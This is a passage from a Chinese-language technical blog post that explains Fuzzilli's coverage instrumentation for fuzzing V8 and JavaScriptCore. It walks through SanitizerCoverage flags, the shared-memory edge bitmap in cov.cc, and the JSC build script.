/</span><br><span class="hljs-string">|/</span><br>C<br></code></pre></td></tr></table></figure><h6 id="Tracing-data-flow"><a href="#Tracing-data-flow" class="headerlink" title="Tracing data flow"></a>Tracing data flow</h6><p>目前支持如下数据流相关插桩方式, 以支持数据流引导的fuzzing。</p><ul><li>使用<code>-fsanitize-coverage=trace-cmp</code>标志, 编译器会在<strong>比较和switch语句</strong>周围进行额外的插桩,</li><li><code>-fsanitize-coverage=trace-div</code>标志会对<strong>整数除法</strong>进行插桩</li><li><code>-fsanitize-coverage=trace-gep</code>会对<strong>LLVM GEP(Get Element Ptr)指令</strong>进行插桩</li><li><code>-fsanitize-coverage=trace-loads</code>会对<strong>load指令</strong>进行插桩</li><li><code>-fsanitize-coverage=trace-stores</code>会对<strong>store指令</strong>进行插桩</li></ul><p>目前，这些标志本身不能工作-它们需要<code>-fsanize-coverage=&#123;trace-pc,inline-8bit-counters，inline-bool&#125;</code>标志之一才能工作。</p><h6 id="Tracing-control-flow"><a href="#Tracing-control-flow" class="headerlink" title="Tracing control flow"></a>Tracing control flow</h6><p>使用<code>-fsanizize-coverage=control-flow</code>，编译器将创建一个表来收集每个函数的控制流。更具体地说，对于函数中的每个基本块，将填充两个列表。一个列表用于基本块的后继程序，另一个列表用于非内部调用的函数。</p><p>每一个表行包含基本块的地址, 后面跟着后继和callee的null-ended列表。</p><h6 id="默认实现"><a href="#默认实现" class="headerlink" title="默认实现"></a>默认实现</h6><p>sanitizer runtime（AddressSanitizer、MemorySanitizer 等）提供了一些覆盖回调的默认实现。可以使用此实现将覆盖率转储到进程出口的磁盘上。</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs csharp">% cat -n cov.cc<br>     <span class="hljs-number">1</span>  <span class="hljs-meta">#include &lt;stdio.h&gt;</span><br>     <span class="hljs-number">2</span>  __attribute__((noinline))<br>     <span class="hljs-number">3</span>  <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">foo</span>()</span> &#123; printf(<span class="hljs-string">&quot;foo\n&quot;</span>); &#125;<br>     <span class="hljs-number">4</span><br>     <span class="hljs-number">5</span>  <span class="hljs-function"><span class="hljs-built_in">int</span> <span class="hljs-title">main</span>(<span class="hljs-params"><span class="hljs-built_in">int</span> argc, <span class="hljs-built_in">char</span> **argv</span>)</span> &#123;<br>     <span class="hljs-number">6</span>    <span class="hljs-keyword">if</span> (argc == <span class="hljs-number">2</span>)<br>     <span class="hljs-number">7</span>      foo();<br>     <span class="hljs-number">8</span>    printf(<span class="hljs-string">&quot;main\n&quot;</span>);<br>     <span class="hljs-number">9</span>  &#125;<br><br>% clang++ -g cov.cc -fsanitize=address -fsanitize-coverage=trace-pc-guard<br><br>% ASAN_OPTIONS=coverage=<span class="hljs-number">1</span> ./a.<span class="hljs-keyword">out</span>; wc -c *.sancov<br>main<br>SanitizerCoverage: ./a.<span class="hljs-keyword">out</span><span class="hljs-number">.7312</span>.sancov <span class="hljs-number">2</span> PCs written<br><span class="hljs-number">24</span> a.<span class="hljs-keyword">out</span><span class="hljs-number">.7312</span>.sancov<br><br>% ASAN_OPTIONS=coverage=<span class="hljs-number">1</span> ./a.<span class="hljs-keyword">out</span> foo ; wc -c *.sancov<br>foo<br>main<br>SanitizerCoverage: ./a.<span class="hljs-keyword">out</span><span class="hljs-number">.7316</span>.sancov <span class="hljs-number">3</span> PCs written<br><span class="hljs-number">24</span> a.<span class="hljs-keyword">out</span><span class="hljs-number">.7312</span>.sancov<br><span class="hljs-number">32</span> a.<span class="hljs-keyword">out</span><span class="hljs-number">.7316</span>.sancov<br></code></pre></td></tr></table></figure><h5 id="桩回调函数cov-cc"><a href="#桩回调函数cov-cc" class="headerlink" title="桩回调函数cov.cc"></a>桩回调函数cov.cc</h5><p>根据<code>fuzzilli</code>的编译条件：<code>sanitizer_coverage_flags=&quot;trace-pc-guard&quot;</code>，没有修改插桩方式，也就是默认的<code>Edge</code>插桩。llvm通过插入用户自定义回调的方式来收集覆盖率, 而编译中额外插入的<code>src/fuzzilli/cov.cc</code>就是桩回调函数的实现, 下面研究下fuzzilli是如何实现这些callback的。还记得参数分析的时候有<code>v8_fuzzilli=true</code>吗？那时候有四个文件分别为：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">if</span> (v8_fuzzilli) &#123;<br>  <span class="hljs-attribute">sources</span> += [<br>    <span class="hljs-string">&quot;src/fuzzilli/cov.cc&quot;</span>,// 这四个文件是V8自带的，而不是fuzzilli中的<br>    <span class="hljs-string">&quot;src/fuzzilli/cov.h&quot;</span>,<br>    <span class="hljs-string">&quot;src/fuzzilli/fuzzilli.cc&quot;</span>,<br>    <span class="hljs-string">&quot;src/fuzzilli/fuzzilli.h&quot;</span>,<br>  ]<br>&#125;<br></code></pre></td></tr></table></figure><p>这个<code>cov.cc</code>桩回调函数的实现，接下来分析<code>cov.cc</code>：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">define</span> SHM_SIZE 0x100000<span class="hljs-comment">// 共享内存的大小</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_EDGES ((SHM_SIZE - 4) * 8)<span class="hljs-comment">// 一个边对应u char edges[]中的一个bit，因此最大边得*8</span></span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">shmem_data</span> &#123;<span class="hljs-comment">// 该结构体大小为SHM_SIZE</span><br>  <span class="hljs-type">uint32_t</span> num_edges;<span class="hljs-comment">// 表示边的数量</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> edges[];<span class="hljs-comment">// 存储每条边，每个bit</span><br>&#125;;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">shmem_data</span>* shmem;<span class="hljs-comment">// 执行共享内存的全局指针</span><br></code></pre></td></tr></table></figure><p>在模块初始化时会调用<code>__sanitizer_cov_trace_pc_guard_init()</code>。该方法获取共享内存后会调用<code>sanitizer_cov_reset_edgeguards()</code>对guard section进行初始化：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">sanitizer_cov_reset_edgeguards</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">uint32_t</span> N = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">uint32_t</span>* x = edges_start; x &lt; edges_stop &amp;&amp; N &lt; MAX_EDGES; x++)<br>        *x = ++N;<br>&#125;<br><br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> <span class="hljs-type">void</span> __sanitizer_cov_trace_pc_guard_init(<span class="hljs-type">uint32_t</span>* start,<br>                                                    <span class="hljs-type">uint32_t</span>* stop) &#123;<br>    <span class="hljs-comment">// We should initialize the shared memory region only once. We can initialize</span><br>    <span class="hljs-comment">// it multiple times if it&#x27;s the same region, which is something that appears</span><br>    <span class="hljs-comment">// to happen on e.g. macOS. If we ever see a different region, we will likely</span><br>    <span class="hljs-comment">// overwrite the previous one, which is probably not intended and as such we</span><br>    <span class="hljs-comment">// fail with an error.</span><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">  我们应该只初始化共享内存区域一次。如果它在同一个区域，我们可以对它进行多次初始化，这在macOS上似乎是会发生的。</span><br><span class="hljs-comment">  如果我们看到一个不同的区域，我们可能会覆盖之前的区域，这可能不是我们想要的，因此我们会失败并出现错误。</span><br><span class="hljs-comment">  */</span><br>    <span class="hljs-keyword">if</span> (shmem) &#123;<br>        ...<br>            <span class="hljs-comment">// Already initialized. 已经初始化过了就返回。</span><br>            <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-comment">// Map the shared memory region</span><br>    <span class="hljs-comment">// 通过环境变量获取共享内存key</span><br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span>* shm_key = <span class="hljs-built_in">getenv</span>(<span class="hljs-string">&quot;SHM_ID&quot;</span>);<br>    <span class="hljs-keyword">if</span> (!shm_key) &#123;<span class="hljs-comment">//如果没有，则自己映射一片内存自己用</span><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;[COV] no shared memory bitmap available, skipping\n&quot;</span>);<br>        shmem = (<span class="hljs-keyword">struct</span> shmem_data*)v8::base::<span class="hljs-built_in">Malloc</span>(SHM_SIZE);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-comment">// 存在SHM_ID</span><br>        <span class="hljs-type">int</span> fd = <span class="hljs-built_in">shm_open</span>(shm_key, O_RDWR, S_IREAD | S_IWRITE);<span class="hljs-comment">// 获取共享内存的fd</span><br>        <span class="hljs-keyword">if</span> (fd &lt;= <span class="hljs-number">-1</span>) &#123; <span class="hljs-comment">// 错误处理</span><br>            <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;[COV] Failed to open shared memory region\n&quot;</span>);<br>            _exit(<span class="hljs-number">-1</span>);<br>        &#125;<br>        <span class="hljs-comment">// 映射到本进程的地址空间中</span><br>        shmem = (<span class="hljs-keyword">struct</span> shmem_data*)<span class="hljs-built_in">mmap</span>(<span class="hljs-number">0</span>, SHM_SIZE, PROT_READ | PROT_WRITE,<br>                                         MAP_SHARED, fd, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> (shmem == MAP_FAILED) &#123;<br>            <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;[COV] Failed to mmap shared memory region\n&quot;</span>);<br>            _exit(<span class="hljs-number">-1</span>);<br>        &#125;<br>    &#125;<br><br>    edges_start = start;<span class="hljs-comment">// guard section的起始位置</span><br>    edges_stop = stop;<span class="hljs-comment">// guard section的结束位置</span><br>    <span class="hljs-built_in">sanitizer_cov_reset_edgeguards</span>();<span class="hljs-comment">// 调用sanitizer_cov_reset_edgeguards，初始化每条edge的guard_variable</span><br><br>    shmem-&gt;num_edges = <span class="hljs-built_in">static_cast</span>&lt;<span class="hljs-type">uint32_t</span>&gt;(stop - start);<span class="hljs-comment">// 初始化num_edges，也就是共享内存中的edge数量</span><br>    builtins_start = <span class="hljs-number">1</span> + shmem-&gt;num_edges;<br>    <span class="hljs-built_in">fprintf</span>(stderr,<br>            <span class="hljs-string">&quot;[COV] edge counters initialized. Shared memory: %s with %u edges\n&quot;</span>,<br>            shm_key, shmem-&gt;num_edges);<br>&#125;<br><br></code></pre></td></tr></table></figure><p><code>sanitizer_cov_reset_edgeguards()</code>会为<code>[start,stop)</code>从1开始连续赋值，如果超过了<code>MAX_EDGES</code>，那么超出部分的边就不会被初始化。紧接着看一下<code>__sanitizer_cov_trace_pc_guard()</code>回调函数，前文提及过，它会在边被执行时触发。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> <span class="hljs-type">void</span> __sanitizer_cov_trace_pc_guard(<span class="hljs-type">uint32_t</span>* guard) &#123;<br>    <span class="hljs-comment">// There&#x27;s a small race condition here: if this function executes in two</span><br>    <span class="hljs-comment">// threads for the same edge at the same time, the first thread might disable</span><br>    <span class="hljs-comment">// the edge (by setting the guard to zero) before the second thread fetches</span><br>    <span class="hljs-comment">// the guard value (and thus the index). However, our instrumentation ignores</span><br>    <span class="hljs-comment">// the first edge (see libcoverage.c) and so the race is unproblematic.</span><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">  这里有一个小的竞争条件：如果这个函数在两个线程中同时对同一条边执行，那么在第二个线程获取保护值（从而获取索引）之前，</span><br><span class="hljs-comment">  第一个线程可能会禁用该边（通过将保护设置为零）。然而，我们的检测忽略了第一条边（参见libcoverage.c），</span><br><span class="hljs-comment">  因此竞争是没有问题的。</span><br><span class="hljs-comment">  */</span><br>    <span class="hljs-type">uint32_t</span> index = *guard;<span class="hljs-comment">// 获取边对应的唯一标识</span><br>    shmem-&gt;edges[index / <span class="hljs-number">8</span>] |= <span class="hljs-number">1</span> &lt;&lt; (index % <span class="hljs-number">8</span>);<span class="hljs-comment">// 设置shmem-&gt;edges中第index个bit为1，表示该边已被执行</span><br>    *guard = <span class="hljs-number">0</span>;<span class="hljs-comment">// 再将这条边置为0，因此再次执行时，就不会触发callback了。</span><br>&#125;<br></code></pre></td></tr></table></figure><p>由上可以看出, <code>shmem-&gt;edges</code>是一个bit map（位图）, 就好像一个二维码一样, 记录着对于某个样本所有执行到的边。</p><p>这里会有一个问题, <code>shmem-&gt;edges</code>能记录的边的数量是有限的, 最大为<code>MAX_EDGES</code>, 等于<code>(0x100000-4)*8 = 8388576</code>, 够用么?</p><p>答案是够用, 实际执行时最多要记录<code>1367283</code>条边, 小于<code>MAX_EDGES</code>, 因此不会有边被忽略掉。 这个1367283从何而来呢？<code>shmem-&gt;num_edges</code>会记录下来，因此可以拿到所有的边。</p><p>这个边的数量比想象中要少，为什么呢？因为编译器会对插桩进行优化：</p><ul><li><strong>SanitizerCoverage 的优化</strong>：编译器会避免对某些低风险代码（如简单算术运算）插桩，减少边数量。</li><li>即使 V8 是一个复杂项目，其 <strong>控制流图（CFG）的边数量</strong> 仍受以下因素限制：<ul><li><strong>函数数量</strong>：V8 的核心功能（如解析、编译、执行）的代码路径是有限的。</li><li><strong>循环和分支的复杂度</strong>：大多数函数的控制流不会无限膨胀。</li></ul></li></ul><p>如果目标更庞大，一个超大型代码库呢？</p><p>起始，我们所做的就是一个超大型代码库的一部分。Chromium 浏览器是十分庞大的，但是可以经过功能拆解，分成许多子模块进行测试，比如我们测试的v8 Js引擎。倘若真是一个很大的目标程序，也可以选择扩大共享内存（例如，libFuzzer的<code>-shm_base_size</code>参数）。</p><p>接下来看看<code>cov.cc</code>中其他的函数：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">uint32_t</span> <span class="hljs-title">sanitizer_cov_count_discovered_edges</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">uint32_t</span> on_edges_counter = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">uint32_t</span> i = <span class="hljs-number">1</span>; i &lt; builtins_start; ++i) &#123;<br>        <span class="hljs-type">const</span> <span class="hljs-type">uint32_t</span> byteIndex = i &gt;&gt; <span class="hljs-number">3</span>;  <span class="hljs-comment">// 找到当前边i对应的字节在数组中的位置。</span><br>        <span class="hljs-type">const</span> <span class="hljs-type">uint32_t</span> bitIndex = i &amp; <span class="hljs-number">7</span>;  <span class="hljs-comment">// 找到当前边在字节中的具体位置。</span><br><br>        <span class="hljs-keyword">if</span> (shmem-&gt;edges[byteIndex] &amp; (<span class="hljs-number">1</span> &lt;&lt; bitIndex)) &#123;<span class="hljs-comment">// 边存在的话</span><br>            ++on_edges_counter;<span class="hljs-comment">// 计数</span><br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> on_edges_counter; <span class="hljs-comment">// 返回统计结果。</span><br>&#125;<br></code></pre></td></tr></table></figure><p><code>sanitizer_cov_count_discovered_edges()</code>会遍历所有边，统计已经被执行过的代码路径（edges）的数量。接下来是内置函数的边初始化。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">cov_init_builtins_edges</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> num_edges)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (num_edges + shmem-&gt;num_edges &gt; MAX_EDGES) &#123;<span class="hljs-comment">// 检查共享内存剩余空间是否能容纳新增的边</span><br>        <span class="hljs-built_in">fprintf</span>(stderr,<br>                <span class="hljs-string">&quot;[COV] Error: Insufficient amount of edges left for builtins &quot;</span><br>                <span class="hljs-string">&quot;coverage.\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    builtins_edge_count = num_edges;<span class="hljs-comment">// 保存新增的内置函数边数量</span><br>    builtins_start = <span class="hljs-number">1</span> + shmem-&gt;num_edges;<span class="hljs-comment">// 内置函数的边从当前总边数+1开始。</span><br>    shmem-&gt;num_edges += builtins_edge_count;<span class="hljs-comment">// 更新总边数</span><br>    <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;[COV] Additional %d edges for builtins initialized.\n&quot;</span>,<br>            num_edges);<br>&#125;<br></code></pre></td></tr></table></figure><p>参数<code>num_edges</code>为内置函数新增的边的数量。这样做是为了分隔内置函数与用户代码，以便单独启用&#x2F;禁用内置函数的覆盖率检测。<strong>内置函数是指由语言或引擎本身预先实现并提供给用户直接调用的核心功能函数。</strong> 它们通常是语言标准的一部分，无需用户手动定义即可实现。</p><p>接下来是最后一个函数，更新内置函数的基本块覆盖率信息到共享内存中：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// This function is ran once per REPRL loop. In case of crash the coverage of</span><br><span class="hljs-comment">// crash will not be stored in shared memory. Therefore, it would be useful, if</span><br><span class="hljs-comment">// we could store these coverage information into shared memory in real time.</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">这个函数在每个REPRL循环中运行一次。在崩溃的情况下，崩溃的覆盖将不会存储在共享内存中。因此，如果我们能够实时地将这些覆盖</span><br><span class="hljs-comment">率信息存储到共享内存中，这将是非常有用的。</span><br><span class="hljs-comment">*/</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">cov_update_builtins_basic_block_coverage</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">    <span class="hljs-type">const</span> std::vector&lt;<span class="hljs-type">bool</span>&gt;&amp; cov_map)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (cov_map.<span class="hljs-built_in">size</span>() != builtins_edge_count) &#123;<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;[COV] Error: Size of builtins cov map changed.\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">uint32_t</span> i = <span class="hljs-number">0</span>; i &lt; cov_map.<span class="hljs-built_in">size</span>(); ++i) &#123;<br>        <span class="hljs-keyword">if</span> (cov_map[i]) &#123;<br>            <span class="hljs-type">const</span> <span class="hljs-type">uint32_t</span> byteIndex = (i + builtins_start) &gt;&gt; <span class="hljs-number">3</span>;<br>            <span class="hljs-type">const</span> <span class="hljs-type">uint32_t</span> bitIndex = (i + builtins_start) &amp; <span class="hljs-number">7</span>;<br><br>            shmem-&gt;edges[byteIndex] |= (<span class="hljs-number">1</span> &lt;&lt; bitIndex);<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>这个函数是为了将内置函数的覆盖率信息及时写入共享内存，即使发送Crash也能保存已经探索的路径。</p><h4 id="JavaScriptCore引擎的编译分析"><a href="#JavaScriptCore引擎的编译分析" class="headerlink" title="JavaScriptCore引擎的编译分析"></a>JavaScriptCore引擎的编译分析</h4><p>以下是JSC引擎编译的脚本：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">export</span> WEBKIT_OUTPUTDIR=FuzzBuild<span class="hljs-comment"># 设置WebKit构建输出目录为&quot;FuzzBuild&quot;，这样所有构建生成是文件都会放在这个目录下</span><br><br><span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-subst">$(uname)</span>&quot;</span> == <span class="hljs-string">&quot;Linux&quot;</span> ]; <span class="hljs-keyword">then</span><span class="hljs-comment"># 检测操作系统是否为Linux</span><br>    ./Tools/Scripts/build-jsc --jsc-only --debug --cmakeargs=<span class="hljs-string">&quot;-DENABLE_STATIC_JSC=ON -DCMAKE_C_COMPILER=&#x27;/usr/bin/clang&#x27; -DCMAKE_CXX_COMPILER=&#x27;/usr/bin/clang++&#x27; -DCMAKE_CXX_FLAGS=&#x27;-fsanitize-coverage=trace-pc-guard -O3 -lrt&#x27;&quot;</span><br><span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Unsupported operating system&quot;</span><br><span class="hljs-keyword">fi</span><br></code></pre></td></tr></table></figure><p>调用<code>./Tools/Scripts/build-jsc</code>构建脚本，参数：<code>--jsc-only</code>，只构建JavaScriptCore（不构建整个webKit）。<code>--debug</code>：构建调试版本。<code>--cmakeargs</code>：传递给CMake的额外参数。如下：</p><figure class="highlight csp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csp">&quot;-DENABLE_STATIC_JSC=ON -DCMAKE_C_COMPILER=<span class="hljs-string">&#x27;/usr/bin/clang&#x27;</span> -DCMAKE_CXX_COMPILER=<span class="hljs-string">&#x27;/usr/bin/clang++&#x27;</span> -DCMAKE_CXX_FLAGS=<span class="hljs-string">&#x27;-fsanitize-coverage=trace-pc-guard -O3 -lrt&#x27;</span>&quot;<br></code></pre></td></tr></table></figure><ul><li><code>-DENABLE_STATIC_JSC=ON</code>：启用静态链接的JSC构建</li><li><code>-DCMAKE_C_COMPILER=&#39;/usr/bin/clang&#39;</code>：指定使用Clang作为C编译器</li><li><code>-DCMAKE_CXX_COMPILER=&#39;/usr/bin/clang++&#39;</code>：指定使用Clang++作为C++编译器</li><li><code>-DCMAKE_CXX_FLAGS=...</code>：设置C++编译标志<ul><li><code>-fsanitize-coverage=trace-pc-guard</code>：启用代码覆盖率检测（用于模糊测试）</li><li><code>-03</code>：最高级别优化</li><li><code>-lrt</code>：链接实时库（Linux特定）</li></ul></li></ul><p>其实逻辑是一致的，回调函数的定义在<code>./webkit/Source/JavaScriptCore/fuzzilli/Fuzzilli.cpp</code>，当边被执行时，guard被触发，其逻辑是一致的：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> <span class="hljs-type">void</span> __sanitizer_cov_trace_pc_guard(<span class="hljs-type">uint32_t</span>* guard)<br>&#123;<br>    <span class="hljs-comment">// There&#x27;s a small race condition here: if this function executes in two threads for the same</span><br>    <span class="hljs-comment">// edge at the same time, the first thread might disable the edge (by setting the guard to zero)</span><br>    <span class="hljs-comment">// before the second thread fetches the guard value (and thus the index). However, our</span><br>    <span class="hljs-comment">// instrumentation ignores the first edge (see libcoverage.c) and so the race is unproblematic.</span><br><br>    <span class="hljs-type">uint32_t</span> index = *guard;<br>WTF_ALLOW_UNSAFE_BUFFER_USAGE_BEGIN<br>    Fuzzilli::sharedData-&gt;edges[index / <span class="hljs-number">8</span>] |= <span class="hljs-number">1</span> &lt;&lt; (index % <span class="hljs-number">8</span>);<br>WTF_ALLOW_UNSAFE_BUFFER_USAGE_END<br><br>    *guard = <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>以及初始化guard section也是一致的，不过它选择让<code>initializeCoverage()</code>执行初始化<code>guard_variable</code>的操作</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> <span class="hljs-type">void</span> __sanitizer_cov_trace_pc_guard_init(<span class="hljs-type">uint32_t</span>* start, <span class="hljs-type">uint32_t</span>* stop);<br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> <span class="hljs-type">void</span> __sanitizer_cov_trace_pc_guard_init(<span class="hljs-type">uint32_t</span>* start, <span class="hljs-type">uint32_t</span>* stop)<br>&#123;<br>    <span class="hljs-comment">// Avoid duplicate initialization.</span><br>    <span class="hljs-keyword">if</span> (start == stop || *start)<br>        <span class="hljs-keyword">return</span>;<br><br>    Fuzzilli::<span class="hljs-built_in">initializeCoverage</span>(start, stop);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">SUPPRESS_COVERAGE</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Fuzzilli::initializeCoverage</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span>* start, <span class="hljs-type">uint32_t</span>* stop)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">RELEASE_ASSERT_WITH_MESSAGE</span>(!edgesStart &amp;&amp; !edgesStop, <span class="hljs-string">&quot;Coverage instrumentation is only supported for a single module&quot;</span>);<br><br>    edgesStart = start;<br>    edgesStop = stop;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-type">const</span> <span class="hljs-type">char</span>* shmKey = <span class="hljs-built_in">getenv</span>(<span class="hljs-string">&quot;SHM_ID&quot;</span>)) &#123;<br>        <span class="hljs-type">int32_t</span> fd = <span 